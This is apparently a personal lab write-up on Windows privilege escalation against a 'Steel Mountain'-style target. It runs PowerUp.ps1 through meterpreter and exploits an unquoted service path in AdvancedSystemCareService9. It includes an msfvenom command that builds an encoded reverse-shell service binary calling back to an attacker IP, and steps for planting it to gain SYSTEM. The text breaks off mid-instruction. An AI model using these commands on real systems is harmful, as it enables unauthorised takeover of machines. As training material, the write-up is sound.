After gaining a shell to a windows machine, upload the PowerUp.ps1 script through the meterpreter shell with `upload /path/to/PowerUp.ps1` then load powershell with `load powershell` and enter into powershell with `powershell_shell` now run the PowerUp.ps1 script with `. .\PowerUp.ps1`. 

Run `Invoke-AllChecks` in powershell to see a detailed list of potential vulnerabilities or misconfigurations, along with some context or explanation for each finding.

I noticed these results that have the `CanRestart` option set to `true`:
```
ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths
```

The `PowerUp.ps1` script has identified a service named `AdvancedSystemCareService9` with several vulnerabilities, specifically "Unquoted Service Paths." This vulnerability occurs when the service path is not enclosed in quotes and contains spaces. You can exploit this by placing a malicious executable in one of the paths that the system checks when launching the service.

The service path is `C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe`. Because this path is unquoted and contains spaces, You could potentially place a malicious executable named `Program.exe` in `C:\` or another executable named `Files.exe` in `C:\Program`, and so on. When the service starts, the system could execute the malicious file instead of the intended service.

The `AbuseFunction` field suggests using the `Write-ServiceBinary` function to exploit this vulnerability. You could replace the service binary (`ASCService.exe`) with your own malicious executable, such as the `Advanced.exe` generated by `msfvenom`.

The `ModifiablePath` field indicates which parts of the file path can be modified by non-privileged users, providing further opportunities for exploitation.

Given that the service runs as `LocalSystem`, exploiting this vulnerability would give you system-level privileges on the machine.

If you were to use the `Advanced.exe` payload generated by `msfvenom` to replace `ASCService.exe` (or place it in a location specified by `ModifiablePath`), you could potentially gain a reverse shell with system-level privileges when the service is restarted.

The `CanRestart` option being `true`, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program.

Use `msfvenom` to generate a windows reverse shell over TCP [[Metasploit#Windows reverse shell over TCP]]:
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.4.20.218 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```

Then upload it using `upload /path/to/Advanced.exe` and run with `execute -f Advanced.exe`. Remember, the `AdvancedSystemCareService9` service is vulnerable to "Unquoted Service Paths." This vulnerability can be exploited if the service path is not enclosed in quotes and contains spaces. In this case, the service path is `C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe`, which is unquoted and contains spaces.

To exploit this vulnerability, place the `Advanced.exe` in the `C:\Program Files (x86)\IObit\` directory, then stop the `AdvancedSystemCareService9` service through meterpreter with ``

[PowerUp.ps1 script](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)